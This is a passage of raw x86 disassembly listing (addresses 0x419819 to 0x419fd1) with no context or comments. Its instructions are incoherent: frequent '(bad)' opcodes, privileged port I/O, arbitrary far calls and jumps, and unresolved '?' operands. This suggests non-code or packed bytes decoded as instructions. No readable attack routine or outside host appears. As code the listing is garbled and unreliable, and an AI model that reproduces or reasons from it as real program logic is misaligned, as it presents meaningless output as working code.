  419819:	add    BYTE PTR [ecx-0x6db4e46c],cl
  41981f:	call   0xae7a:0xb6105a93
  419826:	mov    eax,ds:0x96385027
  41982b:	sbb    eax,0x26760909
  419830:	and    al,0x16
  419832:	adc    ah,BYTE PTR [ebp-0x7ffd8b7]
  419838:	in     eax,0x77
  41983a:	pop    ecx
  41983b:	leave  
  41983c:	push   DWORD PTR [eax-0x2e]
  41983f:	push   0xcdbf0069
  419844:	add    eax,0x8aee1544
  419849:	xor    BYTE PTR [ebp-0x4c],ah
  41984c:	jl     0x419834
  41984e:	shl    ebx,0x22
  419851:	sbb    ecx,edi
  419853:	loop   0x41982c
  419855:	mov    ecx,0x76917329
  41985a:	stos   BYTE PTR es:[edi],al
  41985b:	test   eax,0x248285d5
  419860:	adc    al,0x1d
  419862:	test   eax,0x6599782f
  419867:	(bad)  
  419868:	mov    esp,0x38077309
  41986d:	(bad)  
  41986e:	jmp    0x563d:0xef9ef435
  419875:	call   0x455d9836
  41987a:	std    
  41987b:	sub    eax,DWORD PTR ds:0xad6bcdd9
  419881:	cmp    BYTE PTR [edi-0x42],dl
  419884:	test   DWORD PTR [ebx+esi*2],eax
  419887:	inc    esi
  419888:	pop    ebx
  419889:	fcomp  QWORD PTR [edx+ebp*8+0x76b183c]
  419890:	ds (bad) 
  419892:	shl    BYTE PTR [ebx+0x18],cl
  419895:	mov    eax,ds:0xca57c30f
  41989a:	dec    eax
  41989b:	mov    ds:0xcb9596d0,eax
  4198a0:	inc    ecx
  4198a1:	das    
  4198a2:	adc    DWORD PTR es:[edx+ebp*4+0x72],edi
  4198a7:	mov    esi,0xff23b85
  4198ac:	outs   dx,BYTE PTR ds:[esi]
  4198ad:	sbb    eax,0xde80d084
  4198b2:	xchg   esi,eax
  4198b3:	es scas al,BYTE PTR es:[edi]
  4198b5:	mov    ebx,0x2e3fb1c1
  4198ba:	adc    DWORD PTR [edx],esp
  4198bc:	dec    ebx
  4198bd:	add    eax,0x593adc4e
  4198c2:	enter  0xffc6,0x9
  4198c6:	ds mov eax,0xdf302c85
  4198cc:	test   al,0xcb
  4198ce:	cmp    DWORD PTR [eax-0x7e],ebp
  4198d1:	cld    
  4198d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d3:	jmp    0x10f746d9
  4198d8:	jecxz  0x419926
  4198da:	enter  0xaf2b,0x60
  4198de:	and    DWORD PTR [ebp+0x4d0ccaed],ebp
  4198e4:	or     eax,0xb47963d0
  4198e9:	sbb    edi,DWORD PTR [eax-0x733a9880]
  4198ef:	xchg   esi,eax
  4198f0:	sbb    esi,edx
  4198f2:	push   DWORD PTR [eax]
  4198f4:	mov    eax,0x97c69d2c
  4198f9:	mov    ebx,edx
  4198fb:	or     ebp,ecx
  4198fd:	inc    esi
  4198fe:	nop
  4198ff:	xor    DWORD PTR [edx-0x688b5418],0xffffffd1
  419906:	fmul   QWORD PTR [esi]
  419908:	mov    ch,0x8d
  41990a:	push   ds
  41990b:	ins    BYTE PTR es:[edi],dx
  41990c:	nop
  41990d:	cli    
  41990e:	scas   al,BYTE PTR es:[edi]
  41990f:	add    edi,DWORD PTR [ecx]
  419911:	push   ebp
  419912:	lahf   
  419913:	pusha  
  419914:	ror    DWORD PTR [ebx-0x2f],0x43
  419918:	or     ah,BYTE PTR [edx-0xb0bc15d]
  41991e:	mov    dh,0x4a
  419920:	jbe    0x4198ec
  419922:	push   ss
  419923:	pop    ds
  419924:	mov    dh,0xb3
  419926:	aad    0xf6
  419928:	mov    bh,0xa8
  41992a:	mov    ds:0xa4121c6,al
  41992f:	mov    WORD PTR [eax+0x7ed4fea9],gs
  419935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419936:	sbb    al,0xce
  419938:	or     eax,0xf067adac
  41993d:	(bad)  
  41993e:	stos   BYTE PTR es:[edi],al
  41993f:	inc    BYTE PTR [ecx+0x54]
  419942:	mov    bl,0x39
  419944:	test   al,0xfa
  419946:	mov    ebx,0xcc3c0a43
  41994b:	inc    esi
  41994c:	ins    BYTE PTR es:[edi],dx
  41994d:	jmp    0x419964
  41994f:	mov    cl,0x3b
  419951:	push   es
  419952:	fmulp  st(7),st
  419954:	out    0x52,eax
  419956:	pop    esp
  419957:	std    
  419958:	fsubr  DWORD PTR [ebp+0x34]
  41995b:	inc    edx
  41995c:	pop    esi
  41995d:	scas   al,BYTE PTR es:[edi]
  41995e:	aad    0x19
  419960:	sahf   
  419961:	sub    al,0xfe
  419963:	mov    DWORD PTR [ebx+0x6d],ebx
  419966:	add    edx,DWORD PTR [ebx]
  419968:	in     al,0x92
  41996a:	sub    al,0x19
  41996c:	adc    ecx,ecx
  41996e:	xchg   DWORD PTR [esi],edi
  419970:	inc    esi
  419971:	push   ebx
  419972:	inc    edi
  419973:	mov    BYTE PTR [edi+0x49e453f7],bl
  419979:	jnp    0x419942
  41997b:	mov    bh,0xb2
  41997d:	push   cs
  41997e:	xor    esp,0xffffff84
  419981:	int    0x67
  419983:	ja     0x4199e6
  419985:	xlat   BYTE PTR ds:[ebx]
  419986:	sahf   
  419987:	inc    ebp
  419988:	pop    ds
  419989:	add    BYTE PTR ds:0x64cec566,cl
  41998f:	push   esp
  419990:	dec    esi
  419991:	jecxz  0x4199f1
  419993:	mov    eax,0xf215a1ef
  419998:	mov    esp,0x30328a41
  41999d:	arpl   WORD PTR gs:[eax-0x11a3afd5],si
  4199a4:	cmc    
  4199a5:	aaa    
  4199a6:	int3   
  4199a7:	pusha  
  4199a8:	mov    dh,0x97
  4199aa:	mov    eax,0x447ec788
  4199af:	in     al,0x2f
  4199b1:	cmp    eax,0x649a5f23
  4199b6:	adc    DWORD PTR [esi+0x74],ebx
  4199b9:	inc    ebx
  4199ba:	mov    eax,ds:0xab796d83
  4199bf:	(bad)  
  4199c0:	pop    ss
  4199c1:	js     0x4199ef
  4199c3:	inc    ebx
  4199c4:	int    0xa6
  4199c6:	outs   dx,BYTE PTR ds:[esi]
  4199c7:	adc    edi,esi
  4199c9:	jmp    0x686dda38
  4199ce:	pop    ss
  4199cf:	or     cl,ah
  4199d1:	in     al,dx
  4199d2:	mov    dl,0x12
  4199d4:	out    dx,al
  4199d5:	sbb    DWORD PTR [edi-0x282c9ec6],edi
  4199db:	pop    ecx
  4199dc:	loop   0x4199e8
  4199de:	sbb    ebx,DWORD PTR [esi]
  4199e0:	dec    esp
  4199e1:	sbb    DWORD PTR [esi-0x833d067],edi
  4199e7:	push   ebx
  4199e8:	loope  0x419a2d
  4199ea:	adc    ah,BYTE PTR [eax+0x7d9c95d9]
  4199f0:	dec    ebx
  4199f1:	pop    ebp
  4199f2:	fist   WORD PTR [ebx]
  4199f4:	iret   
  4199f5:	mov    ah,0x62
  4199f7:	lds    eax,FWORD PTR [ecx]
  4199f9:	xchg   ebp,eax
  4199fa:	adc    cl,BYTE PTR [bp+di-0x13ed]
  4199ff:	popa   
  419a00:	imul   BYTE PTR [edi+0x73]
  419a03:	xor    BYTE PTR [ebx-0x1e],al
  419a06:	dec    DWORD PTR [ebx+0x1c770abe]
  419a0c:	add    ebp,DWORD PTR [edx]
  419a0e:	aad    0x8f
  419a10:	or     al,0xfd
  419a12:	jns    0x4199f1
  419a14:	mov    bl,dl
  419a16:	stos   BYTE PTR es:[edi],al
  419a17:	imul   ebx,DWORD PTR [edx],0xffffffea
  419a1a:	enter  0x13ae,0x97
  419a1e:	loope  0x4199ea
  419a20:	cwde   
  419a21:	jge    0x419a42
  419a23:	cs jns 0x419a89
  419a26:	push   esp
  419a27:	xor    BYTE PTR [edi+0x1b],0x5d
  419a2b:	cwde   
  419a2c:	out    dx,eax
  419a2d:	loop   0x419a29
  419a2f:	jl     0x4199cc
  419a31:	push   edi
  419a32:	outs   dx,BYTE PTR ds:[esi]
  419a33:	mov    ebp,0xbc79eb70
  419a38:	call   0xae4d4880
  419a3d:	mov    bl,BYTE PTR [edi-0x4f]
  419a40:	or     bl,BYTE PTR [edx+0x1c]
  419a43:	rcl    dl,cl
  419a45:	pop    ecx
  419a46:	std    
  419a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a48:	repz cmp bl,BYTE PTR [eax-0x61]
  419a4c:	xlat   BYTE PTR ds:[ebx]
  419a4d:	mov    ebp,0x973ea6c5
  419a52:	pop    eax
  419a53:	out    dx,al
  419a54:	addr16 dec esp
  419a56:	sbb    ebx,DWORD PTR [edx-0x5d9f0d0f]
  419a5c:	or     ebp,edi
  419a5e:	jl     0x419ac6
  419a60:	pushf  
  419a61:	inc    eax
  419a62:	or     BYTE PTR [edx],dl
  419a64:	xor    eax,0x9d1d2f3
  419a69:	cmp    al,0xd6
  419a6b:	dec    esp
  419a6c:	in     eax,dx
  419a6d:	and    eax,0x3d626175
  419a72:	pop    ss
  419a73:	dec    ebp
  419a74:	retf   0x1184
  419a77:	arpl   WORD PTR [eax],dx
  419a79:	add    eax,0xdc224e69
  419a7e:	std    
  419a7f:	pop    ebp
  419a80:	shr    esp,1
  419a82:	pop    eax
  419a83:	cmp    al,0x4f
  419a85:	push   0xffffffc1
  419a87:	into   
  419a88:	shl    sp,cl
  419a8b:	mov    al,ds:0xdc5b19c0
  419a90:	icebp  
  419a91:	test   BYTE PTR [edx+0x4d],ah
  419a94:	jmp    0x419a63
  419a96:	xchg   DWORD PTR [esi+0x42],ebx
  419a99:	les    ecx,FWORD PTR [ecx]
  419a9b:	xor    esp,DWORD PTR [edx]
  419a9d:	retf   0x7db6
  419aa0:	sbb    al,0xf2
  419aa2:	push   ecx
  419aa3:	imul   eax,DWORD PTR [eax+0x18],0x23
  419aa7:	repnz fwait
  419aa9:	mov    WORD PTR [ebx],?
  419aab:	mov    bh,0x75
  419aad:	inc    eax
  419aae:	test   BYTE PTR [edi+0x34],cl
  419ab1:	mov    DWORD PTR [edi+0x3d],edx
  419ab4:	leave  
  419ab5:	cmc    
  419ab6:	aaa    
  419ab7:	adc    BYTE PTR [eax-0x43],bl
  419aba:	pop    edx
  419abb:	stc    
  419abc:	test   al,0x4
  419abe:	push   ds
  419abf:	push   ds
  419ac0:	fst    DWORD PTR [ebx+ebp*2-0x2d77dc50]
  419ac7:	mov    esi,0x9a4fb944
  419acc:	sub    eax,0xf5f8a7e5
  419ad1:	int    0xe4
  419ad3:	add    ebx,DWORD PTR [esi]
  419ad5:	ss push edx
  419ad7:	push   ss
  419ad8:	call   0x77c3dea9
  419add:	idiv   BYTE PTR [edx-0xc7525d2]
  419ae3:	pusha  
  419ae4:	cld    
  419ae5:	sbb    dl,BYTE PTR [eax+0x45]
  419ae8:	scas   eax,DWORD PTR es:[edi]
  419ae9:	out    0x2d,eax
  419aeb:	mov    bh,0x59
  419aed:	push   es
  419aee:	fnsave cs:[ebx+0x61]
  419af2:	add    edx,eax
  419af4:	(bad)  
  419af5:	sahf   
  419af6:	xor    al,0xe6
  419af8:	in     al,dx
  419af9:	retf   
  419afa:	dec    ebp
  419afb:	push   esp
  419afc:	mov    ebx,0x11791496
  419b01:	or     eax,ebp
  419b03:	das    
  419b04:	imul   eax,DWORD PTR [esi],0xb8cd740f
  419b0a:	xor    ecx,DWORD PTR [esi-0x6940aa5c]
  419b10:	mov    cl,0x9b
  419b12:	call   0x355f:0x40858553
  419b19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b1a:	xor    ebp,DWORD PTR [ebx]
  419b1c:	pop    ebp
  419b1d:	jns    0x419b0a
  419b1f:	jecxz  0x419b10
  419b21:	add    DWORD PTR [edx],edi
  419b23:	lahf   
  419b24:	and    BYTE PTR [ebx+0x54],bl
  419b27:	xchg   ebp,eax
  419b28:	push   ebp
  419b29:	sbb    BYTE PTR [ebp-0x7248adbc],al
  419b2f:	fistp  DWORD PTR [ecx]
  419b31:	leave  
  419b32:	mov    ch,0x22
  419b34:	sti    
  419b35:	or     al,0x46
  419b37:	ds call 0xd0cc:0xae121cd1
  419b3f:	sahf   
  419b40:	scas   eax,DWORD PTR es:[edi]
  419b41:	xchg   edi,eax
  419b42:	iret   
  419b43:	cmp    ch,ch
  419b45:	call   0x84c19d5f
  419b4a:	dec    ecx
  419b4b:	pop    es
  419b4c:	cmc    
  419b4d:	cmp    al,bh
  419b4f:	lods   al,BYTE PTR ds:[esi]
  419b50:	mov    eax,0x487b9570
  419b55:	sub    edx,DWORD PTR [ecx+0x2b]
  419b58:	mov    al,0x7f
  419b5a:	or     ch,ch
  419b5c:	addr16 mov al,0x1e
  419b5f:	retf   
  419b60:	add    ebx,ebx
  419b62:	mov    ds:0xd10a44ac,eax
  419b67:	inc    esp
  419b68:	push   ebx
  419b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b6a:	jp     0x419b7e
  419b6c:	mov    ch,0x3b
  419b6e:	and    edx,eax
  419b70:	popf   
  419b71:	adc    eax,0x74880e79
  419b76:	pop    edi
  419b77:	retf   0xaa6e
  419b7a:	(bad)  
  419b7b:	fiadd  DWORD PTR [ecx]
  419b7d:	push   esp
  419b7e:	outs   dx,DWORD PTR ds:[esi]
  419b7f:	mov    ?,WORD PTR [esp+eiz*4]
  419b82:	aaa    
  419b83:	mov    ecx,0x84ccdc66
  419b88:	shl    BYTE PTR [ebp+ebx*4+0x32],0xa4
  419b8d:	call   0x713f:0x2421882f
  419b94:	add    eax,ebx
  419b96:	and    bl,BYTE PTR [edi]
  419b98:	fcomip st,st(4)
  419b9a:	test   eax,0x2a38767b
  419b9f:	stc    
  419ba0:	jnp    0x419bd8
  419ba2:	enter  0x1b87,0x43
  419ba6:	int3   
  419ba7:	or     ecx,DWORD PTR ds:0xa54105fe
  419bad:	data16 (bad) 
  419baf:	into   
  419bb0:	pop    ebx
  419bb1:	inc    ecx
  419bb2:	ins    DWORD PTR es:[edi],dx
  419bb3:	call   0x87ca:0x69852ade
  419bba:	out    0x2f,eax
  419bbc:	(bad)  
  419bbd:	scas   al,BYTE PTR es:[edi]
  419bbe:	sub    eax,0xb870aef2
  419bc3:	push   ebx
  419bc4:	(bad)  
  419bc5:	iret   
  419bc6:	jno    0x419b6b
  419bc8:	push   es
  419bc9:	mov    esp,0xdc7d98ff
  419bce:	add    DWORD PTR [eax-0x54839b98],0xb3706d6
  419bd8:	xor    ebx,DWORD PTR [ebp+0x3d]
  419bdb:	mov    eax,ds:0xf59fbfa6
  419be0:	shr    DWORD PTR [edx-0xb],0xc1
  419be4:	scas   eax,DWORD PTR es:[edi]
  419be5:	xor    eax,0x45b16b15
  419bea:	inc    edi
  419beb:	cmp    ebx,0x15
  419bee:	xchg   esi,eax
  419bef:	ins    DWORD PTR es:[edi],dx
  419bf0:	ja     0x419c15
  419bf2:	push   edx
  419bf3:	mov    WORD PTR [esi-0x513d9800],?
  419bf9:	icebp  
  419bfa:	cld    
  419bfb:	popa   
  419bfc:	int    0x9d
  419bfe:	xchg   esp,eax
  419bff:	xor    DWORD PTR [edi+0x4a],0xffffff9d
  419c03:	push   ebp
  419c04:	popf   
  419c05:	sahf   
  419c06:	add    DWORD PTR [ebp+edi*1-0x5],ebx
  419c0a:	push   0xffffffde
  419c0c:	into   
  419c0d:	push   ebx
  419c0e:	jbe    0x419bec
  419c10:	pop    eax
  419c11:	xchg   ebx,eax
  419c12:	sahf   
  419c13:	xor    DWORD PTR [ecx+0x29b32447],edx
  419c19:	ret    
  419c1a:	inc    esi
  419c1b:	jne    0x419bbb
  419c1d:	xchg   esp,eax
  419c1e:	mov    ebx,0x6182989e
  419c23:	jnp    0x419be3
  419c25:	mov    bh,0x3a
  419c27:	into   
  419c28:	out    dx,al
  419c29:	ficom  WORD PTR [esi]
  419c2b:	lock call 0x9e6f:0xa1e27313
  419c33:	(bad)  
  419c34:	mov    al,0x1e
  419c36:	rcr    DWORD PTR [edi],0x3f
  419c39:	jg     0x419c61
  419c3b:	shl    BYTE PTR [edi-0x453ecb91],0x89
  419c42:	mov    esp,0x229419d7
  419c47:	mov    esp,0x7d29e650
  419c4c:	imul   esp,DWORD PTR [ebx+0x52b72683],0x6e
  419c53:	rol    ah,0xef
  419c56:	pop    ebx
  419c57:	ja     0x419c55
  419c59:	push   esi
  419c5a:	cmp    al,0x24
  419c5c:	sar    DWORD PTR [ebx],0xae
  419c5f:	ret    0xd079
  419c62:	inc    ebp
  419c63:	push   ds
  419c64:	add    DWORD PTR [ecx-0x58],edi
  419c67:	jge    0x419c52
  419c69:	pop    ds
  419c6a:	inc    edi
  419c6b:	jnp    0x419c69
  419c6d:	imul   edx,DWORD PTR [eax],0x24
  419c70:	xor    DWORD PTR [esi],0xf
  419c73:	test   eax,0x24173b24
  419c78:	inc    esp
  419c79:	cmp    DWORD PTR [eax+0x1fed345b],esp
  419c7f:	(bad)  
  419c81:	hlt    
  419c82:	call   FWORD PTR [ecx+0x19516303]
  419c88:	sub    BYTE PTR [esi],0x6f
  419c8b:	add    DWORD PTR ds:0xa3ee2afb,0xcf1c4cb0
  419c95:	sti    
  419c96:	mov    ebx,0x59444aea
  419c9b:	dec    edx
  419c9c:	sbb    DWORD PTR [eax-0xb],ebp
  419c9f:	or     eax,0xa529de9a
  419ca4:	jl     0x419c75
  419ca6:	or     dl,BYTE PTR [ebx+0x1e3fa9bd]
  419cac:	outs   dx,BYTE PTR ds:[esi]
  419cad:	xchg   ecx,eax
  419cae:	mov    edi,0xc43eda07
  419cb3:	add    ebx,DWORD PTR [ebx+0xbbfd7f9]
  419cb9:	sbb    eax,0xbe8eb3ab
  419cbe:	in     al,0x42
  419cc0:	popf   
  419cc1:	dec    ebx
  419cc2:	sub    BYTE PTR [edi-0x310935c3],bl
  419cc8:	or     ah,0x2e
  419ccb:	sbb    eax,0x90928050
  419cd0:	dec    ebp
  419cd1:	outs   dx,BYTE PTR ds:[esi]
  419cd2:	addr16 aam 0x61
  419cd5:	adc    esp,DWORD PTR [ebx-0x6e]
  419cd8:	inc    DWORD PTR [edx-0x67]
  419cdb:	outs   dx,DWORD PTR ds:[esi]
  419cdc:	add    esp,esp
  419cde:	mov    dh,0x99
  419ce0:	mov    cl,0x46
  419ce2:	push   ss
  419ce3:	stos   DWORD PTR es:[edi],eax
  419ce4:	ret    0x4d68
  419ce7:	sbb    edi,DWORD PTR [edi-0x52]
  419cea:	cmc    
  419ceb:	inc    esi
  419cec:	mov    eax,ds:0xec021c7
  419cf1:	test   eax,0x79c9a1c4
  419cf6:	push   edi
  419cf7:	les    ebp,FWORD PTR [ebp+0x7c]
  419cfa:	push   ecx
  419cfb:	xor    al,BYTE PTR [ebx*4-0x18fc8ac6]
  419d02:	xor    ebp,DWORD PTR [eax]
  419d04:	adc    dl,BYTE PTR [esi+eax*1-0x7d3d86dc]
  419d0b:	pop    ebp
  419d0c:	sub    DWORD PTR [eax],eax
  419d0e:	add    BYTE PTR [eax],al
  419d10:	add    BYTE PTR [eax],al
  419d12:	mov    BYTE PTR [ebp-0x40],al
  419d15:	fs int 0xe5
  419d18:	lods   al,BYTE PTR ds:[esi]
  419d19:	in     eax,dx
  419d1a:	or     dh,BYTE PTR [ebp-0x3159f884]
  419d20:	mov    dh,0xaf
  419d22:	ret    
  419d23:	sbb    DWORD PTR [ecx],eax
  419d25:	add    bl,dh
  419d27:	add    al,0x0
  419d29:	add    BYTE PTR [edx+0x36851e82],ah
  419d2f:	stc    
  419d30:	mov    ecx,0x488c8f06
  419d35:	mov    esi,0xe14d31fa
  419d3a:	fsubr  DWORD PTR [ebp+0x2495fefd]
  419d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d41:	inc    eax
  419d42:	mov    cl,0x10
  419d44:	lods   eax,DWORD PTR ds:[esi]
  419d45:	and    BYTE PTR [eax+eax*1-0x53],dl
  419d49:	adc    esp,DWORD PTR es:[ebp+0x6a06b69c]
  419d50:	adc    esp,esi
  419d52:	arpl   WORD PTR [eax],sp
  419d54:	mov    eax,ds:0x40e46ef6
  419d59:	fldcw  WORD PTR [edi+0x68100fea]
  419d5f:	dec    esi
  419d60:	inc    esp
  419d61:	mov    BYTE PTR [eax],dl
  419d63:	ss mov esp,0x63d776d2
  419d69:	call   0x560b4b77
  419d6e:	loope  0x419d81
  419d70:	in     eax,0x55
  419d72:	retf   
  419d73:	cwde   
  419d74:	jl     0x419d2c
  419d76:	(bad)  
  419d77:	mov    eax,0x8d00deea
  419d7c:	mov    eax,ds:0xad17a19a
  419d81:	inc    edx
  419d82:	jne    0x419d9c
  419d84:	in     al,0x3b
  419d86:	inc    ebx
  419d87:	dec    edx
  419d88:	stos   DWORD PTR es:[edi],eax
  419d89:	aam    0xd8
  419d8b:	xchg   esp,eax
  419d8c:	pop    ebx
  419d8d:	stos   BYTE PTR es:[edi],al
  419d8e:	aam    0xec
  419d90:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  419d92:	cmp    edx,DWORD PTR [edx]
  419d94:	jne    0x419e13
  419d96:	push   0xeb936d37
  419d9b:	cmc    
  419d9c:	cdq    
  419d9d:	daa    
  419d9e:	dec    ebx
  419d9f:	imul   ebx,DWORD PTR [esi-0x31c06af6],0xffffffa1
  419da6:	scas   eax,DWORD PTR es:[edi]
  419da7:	xor    BYTE PTR [ebx],0x85
  419daa:	popf   
  419dab:	add    eax,0x7804a42a
  419db0:	mov    ch,0xc1
  419db2:	pusha  
  419db3:	or     ebx,DWORD PTR [esp+eax*8-0x7]
  419db7:	inc    ecx
  419db8:	or     esi,DWORD PTR [ecx-0x57a4c5e7]
  419dbe:	jle    0x419dea
  419dc0:	or     BYTE PTR ds:0xec18a001,bh
  419dc6:	push   esp
  419dc7:	xchg   ax,ax
  419dc9:	xor    al,ch
  419dcb:	repz mov ds:0xb568cdb9,al
  419dd1:	bound  ebx,QWORD PTR [esi]
  419dd3:	and    al,BYTE PTR [esi]
  419dd5:	stc    
  419dd6:	or     eax,eax
  419dd8:	xchg   dh,al
  419dda:	or     BYTE PTR [ebx+eax*8-0x77],bl
  419dde:	jne    0x419e5d
  419de0:	dec    esp
  419de1:	lahf   
  419de2:	loopne 0x419dea
  419de4:	sbb    eax,0x2ecba841
  419de9:	(bad)  
  419dea:	and    BYTE PTR [edi+0x7e0d855a],ah
  419df0:	inc    ebx
  419df1:	pop    eax
  419df2:	inc    eax
  419df3:	lods   al,BYTE PTR ds:[esi]
  419df4:	add    bl,BYTE PTR [eax+0x2aed329a]
  419dfa:	cmp    ebp,DWORD PTR [edx-0x16f723f0]
  419e00:	sar    BYTE PTR [ebp-0x70],cl
  419e03:	dec    ebx
  419e04:	inc    edx
  419e05:	sub    eax,DWORD PTR [ecx-0x11]
  419e08:	aam    0x69
  419e0a:	arpl   WORD PTR [edx+0x29f3f209],si
  419e10:	cmp    DWORD PTR [eax+0x56],0xa10b46bd
  419e17:	push   ebp
  419e18:	pop    esp
  419e19:	jno    0x419e15
  419e1b:	retf   
  419e1c:	call   0x16fb06c8
  419e21:	loopne 0x419dee
  419e23:	stc    
  419e24:	jno    0x419dfe
  419e26:	push   0x605905d2
  419e2b:	ins    BYTE PTR es:[edi],dx
  419e2c:	jnp    0x419dc7
  419e2e:	and    eax,0xa48fb4ea
  419e33:	aam    0x39
  419e35:	mov    esi,0xee7a8864
  419e3a:	inc    eax
  419e3b:	les    edx,FWORD PTR [edx]
  419e3d:	das    
  419e3e:	inc    esp
  419e3f:	pop    ss
  419e40:	call   0x6f82:0xc8018aae
  419e47:	mov    ah,0x8
  419e49:	(bad)  
  419e4a:	test   ebp,0x5eb573e9
  419e50:	gs add eax,0x9ec037ed
  419e56:	(bad)  [ebp+0x62dae15e]
  419e5c:	sbb    eax,esp
  419e5e:	and    eax,DWORD PTR [edx-0x3c]
  419e61:	and    BYTE PTR [ebp-0x7c],bh
  419e64:	in     al,dx
  419e65:	xor    DWORD PTR [edx+0x17f75d26],ebx
  419e6b:	outs   dx,DWORD PTR ds:[esi]
  419e6c:	inc    esi
  419e6d:	sub    BYTE PTR [edi+0x5],al
  419e70:	pop    edi
  419e71:	push   esp
  419e72:	push   edx
  419e73:	mov    eax,0x83ef6af4
  419e78:	pop    ds
  419e79:	(bad)  
  419e7a:	push   edi
  419e7b:	push   ebx
  419e7c:	pop    ebx
  419e7d:	pop    ss
  419e7e:	clc    
  419e7f:	hlt    
  419e80:	das    
  419e81:	pop    ecx
  419e82:	xchg   ebx,eax
  419e83:	test   dh,bh
  419e85:	les    esp,FWORD PTR [ebp+0x6d]
  419e88:	pusha  
  419e89:	int    0x54
  419e8b:	pusha  
  419e8c:	mov    ds:0x25238673,eax
  419e91:	sti    
  419e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e93:	jo     0x419e32
  419e95:	hlt    
  419e96:	dec    edi
  419e97:	pop    esp
  419e99:	mul    DWORD PTR [eax+0xd95597d]
  419e9f:	xchg   esi,eax
  419ea0:	sbb    al,0x24
  419ea2:	mov    eax,ds:0xc00b4a01
  419ea7:	mov    bl,0xf6
  419ea9:	fstp   TBYTE PTR [eax+0x42a60065]
  419eaf:	shr    ah,1
  419eb1:	jp     0x419e7f
  419eb3:	or     eax,ebp
  419eb5:	push   0x1
  419eb7:	rcl    BYTE PTR [esi+0x49],1
  419eba:	cmp    ah,BYTE PTR [ebp+0x6d]
  419ebd:	cmp    BYTE PTR [esi],dl
  419ebf:	sahf   
  419ec0:	pop    esp
  419ec1:	mov    dh,0x44
  419ec3:	outs   dx,DWORD PTR ds:[esi]
  419ec4:	lock out 0x17,al
  419ec7:	xchg   edi,eax
  419ec8:	mov    edx,DWORD PTR [esi+0x48]
  419ecb:	shr    DWORD PTR [ebx+eax*8],cl
  419ece:	xchg   ecx,eax
  419ecf:	pop    edi
  419ed0:	data16 repz (bad) 
  419ed3:	push   0x71
  419ed5:	test   eax,0x48717494
  419eda:	jle    0x419ec9
  419edc:	or     ecx,DWORD PTR [ebx+0x34f928eb]
  419ee2:	nop
  419ee3:	xchg   DWORD PTR [esi+0x6522c52],edi
  419ee9:	outs   dx,DWORD PTR ds:[esi]
  419eea:	push   ds
  419eeb:	jmp    0x419f02
  419eed:	in     al,dx
  419eee:	mov    dl,al
  419ef0:	sar    BYTE PTR [esi],1
  419ef2:	in     eax,dx
  419ef3:	adc    eax,0xa83ce13b
  419ef8:	mov    dl,0xcc
  419efa:	loope  0x419ec0
  419efc:	shl    DWORD PTR [edi],1
  419efe:	(bad)  
  419eff:	xor    ecx,ebx
  419f01:	scas   eax,DWORD PTR es:[edi]
  419f02:	aad    0x3a
  419f04:	fs dec esi
  419f06:	xchg   edx,eax
  419f07:	shl    DWORD PTR [edi+0x68],cl
  419f0a:	jmp    0x8f41:0x9df24049
  419f11:	dec    esp
  419f12:	ins    DWORD PTR es:[edi],dx
  419f13:	hlt    
  419f14:	and    edx,DWORD PTR [esi-0x3a8855b5]
  419f1a:	pop    cx
  419f1c:	xor    ebx,0xffffffce
  419f1f:	div    DWORD PTR [eax+0x7f]
  419f22:	test   eax,0x49b942fd
  419f27:	das    
  419f28:	or     al,0x45
  419f2a:	mov    ch,0x91
  419f2c:	cmc    
  419f2d:	add    al,0xb1
  419f2f:	inc    esi
  419f30:	mov    edx,0xa9f76f30
  419f35:	and    BYTE PTR [edi-0x68],0xfc
  419f39:	shl    BYTE PTR [ebx-0x65],0x1
  419f3d:	cmp    al,BYTE PTR [ecx-0x52]
  419f40:	xchg   ebx,eax
  419f41:	jge    0x419ee5
  419f43:	(bad)  
  419f44:	in     al,0x91
  419f46:	cdq    
  419f47:	jns    0x419efd
  419f49:	mov    WORD PTR [edx+0x25f8a1b7],es
  419f4f:	std    
  419f50:	pop    ebx
  419f51:	adc    ebx,DWORD PTR [ebx+0x19a884e5]
  419f57:	outs   dx,BYTE PTR ds:[esi]
  419f58:	dec    eax
  419f59:	jo     0x419f36
  419f5b:	int    0x58
  419f5d:	inc    ebx
  419f5e:	ds pop edi
  419f60:	ins    BYTE PTR es:[edi],dx
  419f61:	pushf  
  419f62:	pushf  
  419f63:	mov    ss,WORD PTR [ebp+0x49b0771a]
  419f69:	shl    DWORD PTR [edi],1
  419f6b:	clc    
  419f6c:	xor    bh,BYTE PTR [eax-0x42]
  419f6f:	mov    al,0x68
  419f71:	shr    DWORD PTR [edi+0x60051849],0x31
  419f78:	jne    0x419f9a
  419f7a:	mov    cl,0x84
  419f7c:	nop
  419f7d:	bound  ecx,QWORD PTR [ebp+0x6e]
  419f80:	jg     0x419fc3
  419f82:	xchg   ebx,eax
  419f83:	jns    0x419fb2
  419f85:	push   esi
  419f86:	mov    esi,0x98b9e48a
  419f8b:	loope  0x419f39
  419f8d:	xchg   ecx,eax
  419f8e:	mov    ch,0x56
  419f90:	jmp    0x419f60
  419f92:	mov    edi,edi
  419f94:	xchg   edx,eax
  419f95:	data16 into 
  419f97:	iret   
  419f98:	inc    ebp
  419f99:	in     eax,dx
  419f9a:	fwait
  419f9b:	push   edi
  419f9c:	fild   DWORD PTR [esi]
  419f9e:	nop
  419f9f:	iret   
  419fa0:	dec    edi
  419fa1:	mov    dl,0x18
  419fa3:	mov    ds:0x4559654b,eax
  419fa8:	cwde   
  419fa9:	pusha  
  419faa:	sbb    DWORD PTR [edi],esp
  419fac:	retfw  0x2af1
  419fb0:	shr    BYTE PTR [edx],0x25
  419fb3:	adc    DWORD PTR [edi],ebp
  419fb5:	lods   al,BYTE PTR ds:[esi]
  419fb6:	call   0x62c4:0xc80f74df
  419fbd:	imul   ebp,edi,0x8
  419fc0:	loop   0x41a033
  419fc2:	rcl    ch,cl
  419fc4:	cmp    al,0x75
  419fc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fc7:	fcomp  st(3)
  419fc9:	enter  0x685b,0x91
  419fcd:	push   es
  419fce:	ret    0x44ad
  419fd1:	sub    BYTE PTR [edi],bh
